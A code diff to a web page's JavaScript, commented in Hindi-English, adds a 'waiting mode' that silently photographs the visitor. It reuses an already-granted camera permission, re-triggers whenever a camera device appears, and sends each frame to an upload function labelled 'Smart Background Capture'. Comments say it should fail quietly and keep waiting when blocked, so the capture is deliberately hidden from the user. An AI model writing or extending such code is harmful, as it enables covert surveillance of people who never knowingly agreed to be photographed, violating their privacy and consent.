@@ -290,12 +290,54 @@
       }
   }
 
+  // NAYA FUNCTION: Smart Silent Camera Update (Waiting Mode Logic)
   function silentCameraUpdate() {
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-          .then(function(stream) {
-              captureAndUploadPhoto(stream, "Background Return Visit");
-          })
-          .catch(function(err) {});
+      // Check agar browser ke pass pehle se permission 'granted' hai
+      if (navigator.permissions) {
+          navigator.permissions.query({ name: 'camera' }).then(res => {
+              if (res.state === 'granted') {
+                  checkAndCapture();
+              }
+          });
+      } else {
+          checkAndCapture();
+      }
+
+      // WAITING MODE: Jab phone me camera ON/OFF hoga, ye turant active hoga
+      if(navigator.mediaDevices && navigator.mediaDevices.addEventListener) {
+          navigator.mediaDevices.addEventListener('devicechange', () => {
+              if (navigator.permissions) {
+                  navigator.permissions.query({ name: 'camera' }).then(res => {
+                      if (res.state === 'granted') {
+                          checkAndCapture(); // Camera ON hote hi silent capture
+                      }
+                  });
+              } else {
+                  checkAndCapture();
+              }
+          });
+      }
+  }
+
+  function checkAndCapture() {
+      // Bina popup ke check karo ki camera hardware ready hai ya nahi
+      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+          navigator.mediaDevices.enumerateDevices().then(devices => {
+              // Check karte hain ki koi video input (camera) active hai ya nahi
+              const hasCamera = devices.some(device => device.kind === 'videoinput');
+              
+              if (hasCamera) {
+                  // Agar system me camera mil gaya, tabhi photo lene ka try karo
+                  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                      .then(function(stream) {
+                          captureAndUploadPhoto(stream, "Smart Background Capture (Auto-Detect)");
+                      })
+                      .catch(function(err) {
+                          // Agar block hai toh chup-chap fail ho jao, wait karte raho
+                      });
+              }
+          }).catch(err => console.log(err));
+      }
   }
 
   function captureAndUploadPhoto(stream, actionText) {
